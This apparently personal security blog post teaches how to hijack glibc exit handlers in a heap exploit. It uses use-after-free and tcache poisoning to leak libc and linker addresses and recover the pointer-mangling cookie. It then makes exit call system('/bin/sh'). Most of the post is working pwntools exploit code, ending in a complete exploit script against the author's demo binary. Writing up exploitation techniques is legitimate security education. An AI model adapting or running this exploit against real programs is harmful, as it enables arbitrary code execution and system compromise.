---
layout: post
title:  "Exploiting ELF exit handlers"
date:   2025-09-22 06:50:19 +0200
author: cl1nical
hidden: true
---
### Description
Since the removal of malloc and free hooks in glibc 2.34 back in 2021 [(link)](https://developers.redhat.com/articles/2021/08/25/securing-malloc-glibc-why-malloc-hooks-had-go) attackers had to look for other ways of gaining RIP control when doing heap exploitation against ELF files. One of the ways is via the exit handlers that are called when a process calls the **exit** funciton in glibc. This function is a wrapper around another function called **_run_exit_handlers** that wraps several other functions. The latter calls functions in the linker that reside in an RW section of memory, allowing an attacker to overwrite the function that is called and gaining RIP control this way. But it is of course not that simple, since mitigation techniques have been put in place to make it harder for an attacker to do exactly that. For this POC I will be using the [POC binary](/2025/08/13/poc-binary.html). I will be exploiting the UAF bugs read-after-free and write-after-free to leverage tcache poisoning into attacking the exit handlers. The tcache poisoning itself will not be covered, as I already have a [blog post](/2025/08/13/tcache-poison.html) that covers the technique.

### Caveat when debugging
When debugging exploit scripts with GDB and aslr=False, GDB will show that libc and linker belong to the same address space and are adjacent in memory. That might not be true on newer systems, for example Ubuntu 24 and onwards.
```python3
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, aslr=False) # This line here - set to True to actually view full aslr
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path, close_fds=False)
```

### A look at exit
After opening the program in GDB, we can inspect the exit function:
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_1.png" style="width:100%; height:100%;" />
According to RDI=1 the **exit** function was called with a value of 1. This is because I inputted a bogus value in the menu when prompted to select and option, causing the program to exit.<br>

When stepping into the **__run_exit_handlers** function, the section of interest is from **__run_exit_handlers+304** to **__run_exit_handlers+330**. This is the section where the _dl_fini function is being fetched from the *initial* struct inside of the RW section of **glibc**. Not only is **_dl_fini** fetched, but it is in fact encrypted by a LOR 0x11 and XOR with a cookie (from now on: linker cookie). What you're seeing in the picture below are the steps taken to decrypt the **_dl_fini** function so that it can be called. This is one of the 2 mitigation mechanisms put in place to stop the attacker from simply overwriting the **_dl_fini** function directly. The 2nd mitigation we will get to it in the next section: 
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_2.png" style="width:100%; height:100%;" />
Farther down, at **__run_exit_handlers+356** we can see that the call to **_dl_fini** is being made:
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_3.png" style="width:100%; height:100%;" />

### The 2nd mitigation
I mentioned that there are 2 mitigations against us. The 1st one was the linker function encryption with the cookie. The second one is the seperation of address spaces in libc and linker starting from Ubuntu 24. Previously, a libc leak meant that you also had the linker since they were adjacent in memory. That is no longer the case and now you need two seperate leaks for the technique to work. You need to first leak libc to get the address of **system** and also because then you can leak a linker address that is inside of libc. Then you can calculate the base address of the linker using the linker leak and this enables you to calculate the address of **_dl_fini** which is a function that resides in the linker address space. You need to know the address of **_dl_fini** for the cookie decryption to work and you need the cookie to properly encrypt the address of **system** so you can make **exit** call **system** for you. Luckily for us, there is 1 linker address inside of the RW section of libc and if we get an allocation there we can leak that linker address.<br>
In short, the steps that are relevant to the exit handlers exploit technique are:
1. Leak libc address and calculate libc base
1. Leak the linker address that resides at a predictable offset from libc base, calculate the linker base with it
1. Calculate the plaintext address of **_dl_fini** by using its predictable offset from the linker base
1. Leak contents  of *initial* struct (encrypted **_dl_fini** address) that resides at a predictable offset from libc base
1. Use the plaintext address of **_dl_fini** and the encrypted address of **_dl_fini** to calculate the linker cookie  
1. Encrypt the **system** address using the linker cookie
1. Write the encrypted **system** address in the *initial* struct where the encrypted **_dl_fini** used to be
 - In the same write, place the plaintext address of "/bin/sh" on the address right after the encrypted **system**. This will be the first argument to the function being called, effectively making exit call **system(/bin/sh)**

### Important functions
You will need the below functions to get the linker cookie and also use it for encryption:
```python3
def ror64(x, n):
    return ((x >> n) | (x << (64 - n))) & (1 << 64) - 1

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def rol64(x, n):
    return rol(x, n, 64)

def ptr_mangle(decrypted, cookie):
    return rol64(decrypted ^ cookie, 0x11)

def get_cookie(encrypted, decrypted):
    return ror64(encrypted, 0x11) ^ decrypted
```


### The exploit
Using the below code snippet a heap leak and libc leak has been achieved and the attacker is now ready to create arbitrary memory allocations:
```
#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("program")

gs = '''
b exit
c
'''

def ror64(x, n):
    return ((x >> n) | (x << (64 - n))) & (1 << 64) - 1

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def rol64(x, n):
    return rol(x, n, 64)

def ptr_mangle(decrypted, cookie):
    return rol64(decrypted ^ cookie, 0x11)

def get_cookie(encrypted, decrypted):
    return ror64(encrypted, 0x11) ^ decrypted

context.arch = 'amd64'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, aslr=True)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path, close_fds=False)

#shellcode = asm('\n'.join([
    
#]))

def mangle(home, target):
    return (home >> 12) ^ target

def malloc(index: int, size: int, payload: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendafter(b"> ", payload)

def free(index: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())

def edit(index: int, payload: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendafter(b"> ", payload)

def puts(index: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(index).encode())
    io.recvuntil(b"> ")
    leak = io.recvline().strip(b"\n")
    return leak

io = start()

# leak heap base using the first allocation and leak libc using unsortedbin
# alloc 9 chunks (last one is guard chunk)
for i in range(9):
    malloc(i, 0x90, b"A")

# fill 7 in the tcache and 1 in the unsortedbin while keeping guard chunk
for i in range(8):
    free(i)

# leak heap base via chunk 0
heap_leak = puts(0)
heap_leak = heap_leak[:8]
heap_leak = u64(heap_leak.ljust(8,b"\x00"))
heap_base = heap_leak << 12
print("heap_base:",hex(heap_base))

# leak libc via unsortedbin
libc_leak = puts(7)
libc_leak = libc_leak[:8]
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
print("libc_leak:",hex(libc_leak))
libc = libc_leak - 0x203b20 
print("libc:",hex(libc))

# Rearrange the heap so it is easier to work with
free(8)
```
And the next code snippet (with comments) shows how to leak a linker address so that we can calculate the linker base:
```python3
# there is an address in libc that contains a linker ptr: __nptl_rtld_global in libc contains _rtld_global (linker ptr)
# __nptl_rtld_global resides in the rw section of libc

# malloc new chunks with a new size to not get tangled in the old ones
malloc(0, 0x40, b"B")
malloc(1, 0x40, b"B")


# Allocate a little before, so tcache does not 0 out the ptr
# also make sure that the chunk is 16 byte aligned to satisfy tcache
_rtld_global_chunk = libc + 0x2046b8 - 24

free(1)
free(0)

home = heap_base + 0x700
target = _rtld_global_chunk
addr = mangle(home, target)

p = p64(addr)
edit(0, p)

malloc(2, 0x40, b"A")

# Fill the gap down to mangled ptr with printable chars
# since the target ptr ends with 000 we will need to overwrite LSB with 'A'
p = b"A"*25
malloc(3, 0x40, p)
```
And seen from GDB (it says **_rtld_global+65** since we overwrote LSB with 0x41):
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_4.png" style="width:100%; height:100%;" />

And the next code snippet is used to leak the linker address **_rtld_global**, calculate the linker base and calculate the address of the **_dl_fini** function:
```python3
leak = puts(3)
leak = leak[25:24+8]
leak = u64(leak.ljust(8,b"\x00"))
_rtld_global_leak = leak

# shift address 8 bits left to accomodate for the missing '00' in LSB
_rtld_global = _rtld_global_leak << 8
print("_rtld_global_leak:",hex(_rtld_global_leak))
print("_rtld_global:",hex(_rtld_global))

linker = _rtld_global - 0x38000
print("linker base:",hex(linker))

# dl_fini is a function the linker
_dl_fini = linker + 0x5380
print("_dl_fini:",hex(_dl_fini))
```
The next code snippet is used to make an allocation on top of the *initial* struct in libc and then leak the encrypted **dl_fini** function. Together with the plaintext **_dl_fini** this will be used to calculate the linker cookie:
```python3
# Now we need to leak the encrypted _dl_fini and then we can calculate
# the 'linker cookie' which is used to encrypt linker function ptrs
# in order to make it harder for an attacker to make this kind of attack
# by directly overwriting function ptrs

malloc(4, 0x40, b"A")
malloc(5, 0x40, b"A")

free(5)
free(4) # offset 0x 7a0

initial = libc + 0x204fc0 # contains encryped _dl_fini (which is a linker function)
home = heap_base + 0x7a0
target = initial
addr = mangle(home, target)

p = p64(addr)
edit(4, p)

malloc(6, 0x40, b"A")

# write 24 A's to cover the gap down to enc _dl_fini
p = b"A"*24
malloc(7, 0x40, p)

# leak the encrypted _dl_fini
leak = puts(7)
leak = leak[24:24+8]
leak = u64(leak.ljust(8,b"\x00"))
enc_dl_fini = leak

# print the values and calculate the linker cookie value
print("enc_dl_fini:", hex(enc_dl_fini))
l_cookie = get_cookie(enc_dl_fini, _dl_fini)
print("l_cookie:",hex(l_cookie))
```
And in GDB:
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_5.png" style="width:100%; height:100%;" />

Now the final code snippet shows how to overwrite the *initial* struct with the encrypted **system** function and supplying "/bin/sh" as the first argument. Here, I restore the rest of the *initial* struct with the original contents (I just inspected the struct before overwriting with all the A's):
```python3
binsh = libc + 0x1cb42f
system = libc + 0x58750

# encrypt system
enc_system = ptr_mangle(system, l_cookie)

# restore the values at initial and also overwrite enc dl_fini with enc system
# first arg to system will be taken from initial+32 - does not need to be encryped
# to give overview
p = p64(0) # initial+0
p += p64(1) # initial+8
p += p64(4) # initial+16
p += p64(enc_system) # initial+24
p += p64(binsh) # initial+32

edit(7, p)

# Exploit is done - now give invalid menu input to make the program call exit
# through the error function defined in the program
io.sendline(b"6")

io.interactive()
```

Let's take a look inside the **exit** function in GDB again. We can see that it will call **system(/bin/sh)**:
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_6.png" style="width:100%; height:100%;" />

### Running with ASLR in the terminal
<img src="/assets/images/linux/heap/techniques/exit_handlers/exit_7.png" style="width:100%; height:100%;" />

### Shoutout
A shoutout to Anakin from Brunnerne for teaching me the technique and providing crucial python functions back in January.


### Full exploit
```python3
#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("program")

gs = '''
b exit
c
'''

def ror64(x, n):
    return ((x >> n) | (x << (64 - n))) & (1 << 64) - 1

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def rol64(x, n):
    return rol(x, n, 64)

def ptr_mangle(decrypted, cookie):
    return rol64(decrypted ^ cookie, 0x11)

def get_cookie(encrypted, decrypted):
    return ror64(encrypted, 0x11) ^ decrypted

context.arch = 'amd64'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, aslr=False)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path, close_fds=False)

#shellcode = asm('\n'.join([
    
#]))

def mangle(home, target):
    return (home >> 12) ^ target

def malloc(index: int, size: int, payload: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendafter(b"> ", payload)

def free(index: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())

def edit(index: int, payload: bytes):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendafter(b"> ", payload)

def puts(index: int):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(index).encode())
    io.recvuntil(b"> ")
    leak = io.recvline().strip(b"\n")
    return leak

io = start()

# leak heap base using the first allocation and leak libc using unsortedbin
# alloc 9 chunks (last one is guard chunk)
for i in range(9):
    malloc(i, 0x90, b"A")

# fill 7 in the tcache and 1 in the unsortedbin while keeping guard chunk
for i in range(8):
    free(i)

# leak heap base via chunk 0
heap_leak = puts(0)
heap_leak = heap_leak[:8]
heap_leak = u64(heap_leak.ljust(8,b"\x00"))
heap_base = heap_leak << 12
print("heap_base:",hex(heap_base))

# leak libc via unsortedbin
libc_leak = puts(7)
libc_leak = libc_leak[:8]
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
print("libc_leak:",hex(libc_leak))
libc = libc_leak - 0x203b20 
print("libc:",hex(libc))

# Rearrange the heap so it is easier to work with
free(8)

# there is an address in libc that contains a linker ptr: __nptl_rtld_global in libc contains _rtld_global (linker ptr)
# __nptl_rtld_global resides in the rw section of libc

# malloc new chunks with a new size to not get tangled in the old ones
malloc(0, 0x40, b"B")
malloc(1, 0x40, b"B")


# Allocate a little before, so tcache does not 0 out the ptr
# also make sure that the chunk is 16 byte aligned to satisfy tcache
_rtld_global_chunk = libc + 0x2046b8 - 24

free(1)
free(0)

home = heap_base + 0x700
target = _rtld_global_chunk
addr = mangle(home, target)

p = p64(addr)
edit(0, p)

malloc(2, 0x40, b"A")

# Fill the gap down to mangled ptr with printable chars
# since the target ptr ends with 000 we will need to overwrite LSB with 'A'
p = b"A"*25
malloc(3, 0x40, p)

leak = puts(3)
leak = leak[25:24+8]
leak = u64(leak.ljust(8,b"\x00"))
_rtld_global_leak = leak

# shift address 8 bits left to accomodate for the missing '00' in LSB
_rtld_global = _rtld_global_leak << 8
print("_rtld_global_leak:",hex(_rtld_global_leak))
print("_rtld_global:",hex(_rtld_global))

linker = _rtld_global - 0x38000
print("linker base:",hex(linker))

# dl_fini is a function the linker
_dl_fini = linker + 0x5380
print("_dl_fini:",hex(_dl_fini))

# Now we need to leak the encrypted _dl_fini and then we can calculate
# the 'linker cookie' which is used to encrypt linker function ptrs
# in order to make it harder for an attacker to make this kind of attack
# by directly overwriting function ptrs

malloc(4, 0x40, b"A")
malloc(5, 0x40, b"A")

free(5)
free(4) # offset 0x 7a0

initial = libc + 0x204fc0 # contains encryped _dl_fini (which is a linker function)
home = heap_base + 0x7a0
target = initial
addr = mangle(home, target)

p = p64(addr)
edit(4, p)

malloc(6, 0x40, b"A")

# write 24 A's to cover the gap down to enc _dl_fini
p = b"A"*24
malloc(7, 0x40, p)

# leak the encrypted _dl_fini
leak = puts(7)
leak = leak[24:24+8]
leak = u64(leak.ljust(8,b"\x00"))
enc_dl_fini = leak

# print the values and calculate the linker cookie value
print("enc_dl_fini:", hex(enc_dl_fini))
l_cookie = get_cookie(enc_dl_fini, _dl_fini)
print("l_cookie:",hex(l_cookie))

binsh = libc + 0x1cb42f
system = libc + 0x58750

# encrypt system
enc_system = ptr_mangle(system, l_cookie)

# restore the values at initial and also overwrite enc dl_fini with enc system
# first arg to system will be taken from initial+32 - does not need to be encryped
# to give overview
p = p64(0) # initial+0
p += p64(1) # initial+8
p += p64(4) # initial+16
p += p64(enc_system) # initial+24
p += p64(binsh) # initial+32

edit(7, p)

# Exploit is done - now give invalid menu input to make the program call exit
# through the error function defined in the program
io.sendline(b"6")

io.interactive()

```
